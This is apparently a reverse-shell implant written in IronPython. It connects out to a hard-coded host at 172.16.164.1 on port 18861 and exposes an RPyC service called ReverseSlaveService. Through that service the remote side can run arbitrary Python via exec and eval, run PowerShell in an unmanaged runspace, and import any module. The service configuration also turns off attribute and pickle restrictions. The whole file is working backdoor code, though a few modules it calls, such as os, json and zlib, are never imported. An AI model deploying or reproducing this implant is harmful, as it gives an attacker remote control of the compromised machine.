# -*- coding: utf-8 -*-

import clr
import rpyc
import locale
import traceback
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import is_py3k, execute
from time import sleep
#clr.AddReference("IronPython")
#clr.AddReference('IronPython.Modules')
clr.AddReference("System.Management")
clr.AddReference("System.Management.Automation")
from System.Reflection import Assembly
from System.Management.Automation import *
from System.Management.Automation.Host import *
from System.Management.Automation.Runspaces import *
from System.Management.Automation.Runspaces import RunspaceFactory

namespace = None


class PowerShellWrapper:
    def __init__(self, alias=lambda x: x.replace('^', '$')):
        self.runspace = RunspaceFactory.CreateRunspace()
        self.runspace.Open()
        self.ri = RunspaceInvoke(self.runspace)
        self.output = []
        self._alias = alias

    def include(self, files=[]):
        for fl in files:
            self.cmd(open(fl).read())
        return self

    # run q and fill output
    def cmd(self, q):
        self.output = self.ri.Invoke(self._alias(q))
        return self

    # try convert output to string
    def toStr(self):
        return "".join([str(i) for i in self.output])

    def out(self):
        return [[[k, getattr(i.ImmediateBaseObject, k)] for k in dir(i.ImmediateBaseObject) if i.ImmediateBaseObject.GetType().GetProperty(k) and hasattr(i.ImmediateBaseObject, k)] +
                [[k.Name, i.ImmediateBaseObject.GetAttribute(k.Name)] for k in i.ImmediateBaseObject.Attributes if hasattr(i.ImmediateBaseObject, "Attributes")] for i in self.output]


REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)


class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ['__invalidate__']

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]


class ReverseSlaveService(Service):

    __slots__ = ["exposed_namespace"]

    def on_connect(self):
        try:
            self.exposed_namespace = {}
            self._conn._config.update(REVERSE_SLAVE_CONF)

            namespace = UpdatableModuleNamespace(self.exposed_getmodule)
            self._conn.root.set_modules(namespace)
        except Exception:
            traceback.print_exc()

    def on_disconnect(self):
        pass

    def exposed_exit(self):
        try:
            return True
        finally:
            os.exit(0)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        return execute(text, self.exposed_namespace)

    def exposed_ps_execute(self, text):
        """execute powershell in a unmanaged runspace"""
        return PowerShellWrapper().cmd(text).toStr()

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return __import__(name, None, None, "*")

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if type(data) == unicode:
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


conn = rpyc.connect("172.16.164.1", 18861, service=ReverseSlaveService, keepalive=True)
bgsrv = rpyc.BgServingThread(conn)

while True:
    sleep(0.1)
